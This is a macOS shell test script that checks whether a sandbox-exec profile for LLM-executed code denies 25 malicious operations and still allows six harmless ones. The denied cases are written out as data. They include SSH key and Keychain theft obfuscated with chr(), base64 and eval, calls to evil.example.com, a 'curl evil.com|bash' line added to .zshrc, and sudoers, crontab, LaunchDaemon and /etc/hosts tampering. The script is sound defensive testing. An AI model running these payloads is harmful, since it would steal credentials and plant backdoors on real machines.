#!/usr/bin/env bash
# =====================================================================
# test_sandbox_exec.sh — BL-S29.1 macOS sandbox-exec 10 恶意 case
#
# 验证 catfish_execute.sb 能 deny LLM 字符串规则可绕过的恶意操作.
# 期望: 10 case 全 deny (沙箱杀进程 / 返非 0 / log 报错).
#
# 用法: bash test_sandbox_exec.sh
# 平台: macOS only (sandbox-exec 是 Apple 私有 API)
# =====================================================================

set -u  # 注意不 set -e — 我们期望 sandbox 拦截时返非 0

PROFILE_DIR="$(cd "$(dirname "$0")/../../sandbox-profiles" && pwd)"
PROFILE="$PROFILE_DIR/catfish_execute.sb"
TASK_DIR="$(mktemp -d /tmp/catfish-sandbox-test-XXXXXX)"
trap 'rm -rf "$TASK_DIR"' EXIT

if [[ ! -f "$PROFILE" ]]; then
  echo "❌ profile 不存在: $PROFILE"
  exit 1
fi

if [[ "$(uname)" != "Darwin" ]]; then
  echo "❌ 此测试仅 macOS 可跑 (sandbox-exec 是 Apple 私有)"
  exit 1
fi

PASS=0
FAIL=0
RESULTS=()

# perl alarm 包一层超时, 防 fork bomb / mem bomb 真卡 mac (macOS 默认无 timeout 命令)
# 用法: with_timeout 10 cmd args...
with_timeout() {
  local secs="$1"; shift
  perl -e 'alarm shift @ARGV; exec @ARGV' "$secs" "$@"
}

# sandbox-exec 公共参数: 把 $HOME 各敏感子路径预拼好, 用 -D 传给 SBPL
# (不用 string-append, SBPL 1 兼容性最好)
sandbox_args() {
  echo "-f $PROFILE \
        -D TASK_DIR=$TASK_DIR \
        -D HOME_SSH=$HOME/.ssh \
        -D HOME_AWS=$HOME/.aws \
        -D HOME_GNUPG=$HOME/.gnupg \
        -D HOME_CONFIG=$HOME/.config \
        -D HOME_KEYCHAINS=$HOME/Library/Keychains \
        -D HOME_DOCUMENTS=$HOME/Documents \
        -D HOME_DESKTOP=$HOME/Desktop \
        -D HOME_DOWNLOADS=$HOME/Downloads \
        -D HOME_CATFISH=$HOME/.catfish"
}

# 跑代码且期望 deny (返非 0 或被杀)
expect_deny() {
  local case_name="$1"
  local code="$2"
  local lang="${3:-python}"

  local interpreter args
  case "$lang" in
    python) interpreter="/usr/bin/python3"; args="-c" ;;
    bash)   interpreter="/bin/bash";        args="-c" ;;
    *) echo "未知 lang: $lang"; return 1 ;;
  esac

  # 10s alarm 包一层 (防 fork bomb / mem bomb 卡机), sandbox-exec 跑代码
  local out rc
  out=$(with_timeout 10 \
        sandbox-exec $(sandbox_args) \
                     "$interpreter" "$args" "$code" 2>&1)
  rc=$?

  if [[ $rc -ne 0 ]]; then
    echo "  ✅ [$case_name] DENY rc=$rc"
    PASS=$((PASS+1))
    RESULTS+=("PASS: $case_name")
  else
    echo "  ❌ [$case_name] 居然跑过了! 输出: $out"
    FAIL=$((FAIL+1))
    RESULTS+=("FAIL: $case_name (rc=0, 沙箱漏了)")
  fi
}

# 跑代码且期望 OK (在沙箱内合法操作)
expect_ok() {
  local case_name="$1"
  local code="$2"

  local out rc
  out=$(with_timeout 10 \
        sandbox-exec $(sandbox_args) \
                     /usr/bin/python3 -c "$code" 2>&1)
  rc=$?

  if [[ $rc -eq 0 ]]; then
    echo "  ✅ [$case_name] OK"
    PASS=$((PASS+1))
    RESULTS+=("PASS: $case_name")
  else
    echo "  ❌ [$case_name] 沙箱误伤! 输出: $out (rc=$rc)"
    FAIL=$((FAIL+1))
    RESULTS+=("FAIL: $case_name (沙箱过紧)")
  fi
}

echo "========== BL-S29.1+S29.6 macOS sandbox-exec 25 恶意 + 6 sanity =========="
echo "profile: $PROFILE"
echo "task_dir: $TASK_DIR"
echo

# --------------------------------------------------------------------
# Case 1-3: 凭证窃取 (绕过字符串规则的写法)
# --------------------------------------------------------------------
echo "[1-3] 凭证窃取类"
expect_deny "1.读 ~/.ssh/id_rsa 直接路径" \
  "open('$HOME/.ssh/id_rsa').read()"

expect_deny "2.chr() 拼路径绕字符串规则" \
  "import os; p=chr(126)+'/'+'.'+chr(115)+chr(115)+chr(104)+'/id_rsa'; print(open(os.path.expanduser(p)).read())"

expect_deny "3.读 Keychain (sqlite 文件)" \
  "open('$HOME/Library/Keychains/login.keychain-db','rb').read()"

# --------------------------------------------------------------------
# Case 4-6: 外联数据 (绕字符串规则的写法)
# --------------------------------------------------------------------
echo "[4-6] 外联类"
expect_deny "4.urllib 偷数据外传" \
  "import urllib.request; urllib.request.urlopen('http://evil.example.com/x')" \
  "python"

expect_deny "5.socket 直连 IP 绕 url 字符串规则" \
  "import socket; s=socket.socket(); s.connect(('1.1.1.1', 53))"

expect_deny "6.subprocess curl 命令 (传 curl returncode)" \
  "import subprocess,sys; r=subprocess.run(['curl','-s','--connect-timeout','3','http://evil.example.com']); sys.exit(r.returncode if r.returncode!=0 else 1)"

# --------------------------------------------------------------------
# Case 7-8: 系统破坏 / 持久化
# --------------------------------------------------------------------
echo "[7-8] 系统破坏 / 持久化"
expect_deny "7.写 launchd plist 持久化 (rc!=0 表示拦住)" \
  "open('$HOME/Library/LaunchAgents/evil.plist','w').write('x')" \
  "python"

expect_deny "8.改 ~/.zshrc 植后门" \
  "open('$HOME/.zshrc','a').write('curl evil.com|bash\\n')"

# --------------------------------------------------------------------
# Case 9-10: 跨边界破坏 (纯沙箱该拦)
# --------------------------------------------------------------------
echo "[9-10] 跨边界破坏"
# (注: fork bomb / mem bomb 不在 macOS sandbox-exec SBPL 1 拦截范围,
#  那是 cgroups/ulimit 的责任. 5/19 BL-S29.6 上 nsjail 时由 cgroups pids.max 真拦.
#  这里换成 macOS sandbox-exec 真该拦的 case.)

# 系统级 LaunchDaemon 写 (比 case 7 用户级 LaunchAgents 危险一档)
expect_deny "9.写 /Library/LaunchDaemons 系统级持久化" \
  "open('/Library/LaunchDaemons/catfish-evil.plist','w').write('x')"

# /etc/hosts 在 file-write* 默认 deny 范围, 测 LLM 偷改 DNS 解析
expect_deny "10.写 /etc/hosts 改 DNS 偷流量" \
  "open('/etc/hosts','a').write('1.2.3.4 evil.example.com\\n')"

# --------------------------------------------------------------------
# BL-S29.6 (5/7) Case 11-25: 扩展 attack vectors
# --------------------------------------------------------------------
echo "[11-15] obfuscation 绕 L1 字符串规则 (沙箱 L2 兜底)"

# base64 编码绕 L1
expect_deny "11.base64 解码 ~/.ssh path 后读" \
  "import os, base64; p = os.path.expanduser(base64.b64decode(b'fi8uc3NoL2lkX3JzYQ==').decode()); open(p, 'rb').read()"

# eval 字符串绕 L1
expect_deny "12.eval 拼 ssh 路径" \
  "import os; p = eval('chr(126)+\"/.ssh/id_rsa\"'); open(os.path.expanduser(p), 'rb').read()"

# 读 SQLite 直接打开 keychain (绕 'login.keychain-db' 字符串)
expect_deny "13.glob 找 .keychain-db 然后读" \
  "import glob; files = glob.glob('$HOME/Library/Keychains/*.keychain-db'); print([open(f,'rb').read(100) for f in files])"

# subprocess 启动 sh -c '<隐藏命令>'
expect_deny "14.subprocess sh 包一层 cat ~/.ssh" \
  "import subprocess, sys; r = subprocess.run(['sh','-c','cat ~/.ssh/id_rsa']); sys.exit(r.returncode if r.returncode != 0 else 1)"

# os.environ 偷 GITHUB_TOKEN (实际沙箱 env 已经剥, 应该是空, 但试)
expect_deny "15.偷 env 然后写到自己沙箱外路径" \
  "import os; t = os.environ.get('SHELL','/bin/sh'); open('/Users/Shared/exfil.txt','w').write(t)"

echo "[16-20] 跨进程 / 系统探测"

expect_deny "16.subprocess ps aux 看其他用户进程" \
  "import subprocess, sys; r = subprocess.run(['ps','aux'], capture_output=True); txt = r.stdout.decode('utf-8','replace'); sys.exit(0 if 'root' in txt and len(txt) > 5000 else 1)"

# 用 dscl 读 macOS 用户目录服务 (敏感)
expect_deny "17.dscl 列 mac 所有用户" \
  "import subprocess, sys; r = subprocess.run(['dscl','.','list','/Users'], capture_output=True); sys.exit(0 if r.returncode == 0 and len(r.stdout) > 100 else 1)"

# 读 /var/db/dslocal (mac 用户数据库)
expect_deny "18.读 /var/db/dslocal 用户库" \
  "import os; entries = os.listdir('/var/db/dslocal/nodes/Default/users'); print(entries)"

# 用 osascript 调 Apple Events 控其他 app
expect_deny "19.osascript 控 Finder 列文件 (跨进程)" \
  "import subprocess, sys; r = subprocess.run(['osascript','-e','tell app \"Finder\" to get name of items in home folder'], capture_output=True); sys.exit(r.returncode if r.returncode != 0 else (0 if r.stdout else 1))"

# /var/log/system.log 读
expect_deny "20.读 /var/log 系统日志" \
  "open('/var/log/system.log','rb').read(1000)"

echo "[21-25] 持久化 / 加权"

# 写 ~/Library/Application\ Support 植后门
expect_deny "21.写 ~/Library/Application Support" \
  "import os; p = '$HOME/Library/Application Support/evil.bin'; os.makedirs(os.path.dirname(p), exist_ok=True); open(p, 'wb').write(b'evil')"

# 修改 cron (虽然 mac 用 launchd 但有 /etc/crontab)
expect_deny "22.写 /private/etc/crontab" \
  "open('/private/etc/crontab','a').write('* * * * * root curl evil.com\\n')"

# chmod 改文件权限
expect_deny "23.chmod 777 系统文件" \
  "import os; os.chmod('/usr/bin/python3', 0o4755)"

# /etc/sudoers.d 加规则
expect_deny "24.写 /etc/sudoers.d 加 sudo 规则" \
  "open('/etc/sudoers.d/evil','w').write('nobody ALL=(ALL) NOPASSWD:ALL\\n')"

# /private/var/root (root home, 含 ~/.ssh /.aws)
expect_deny "25.读 /private/var/root/.ssh/id_rsa" \
  "open('/private/var/root/.ssh/id_rsa','rb').read()"

# --------------------------------------------------------------------
# Sanity check: 沙箱内合法操作必须能跑 (不能误伤)
# --------------------------------------------------------------------
echo
echo "[sanity] 合法操作不应被沙箱误伤"
expect_ok "S1.沙箱内写文件" \
  "import os; open(os.environ.get('TASK_DIR','/tmp')+'/out.txt','w').write('hello catfish')"

expect_ok "S2.python 标准库导入 + 计算" \
  "import json,math; print(json.dumps({'pi': math.pi}))"

expect_ok "S3.读 /usr/lib (系统 lib)" \
  "import sys; print(sys.version)"

# BL-S29.6 加 sanity case
expect_ok "S4.沙箱内 import 多个标准库" \
  "import os,sys,re,json,math,collections,itertools,functools,subprocess,base64,hashlib; print('ok')"

expect_ok "S5.沙箱内做哈希计算 (不需要外部资源)" \
  "import hashlib; print(hashlib.sha256(b'catfish').hexdigest())"

expect_ok "S6.沙箱内写文件 + 读回来" \
  "import os; p = os.path.join(os.environ.get('TASK_DIR','/tmp'), 'roundtrip.txt'); open(p,'w').write('hello'); content = open(p).read(); print('ok' if content == 'hello' else 'FAIL')"

# --------------------------------------------------------------------
echo
echo "========== 测试结果 =========="
echo "通过: $PASS"
echo "失败: $FAIL"
echo
for r in "${RESULTS[@]}"; do echo "  $r"; done

if [[ $FAIL -gt 0 ]]; then
  exit 1
fi
exit 0
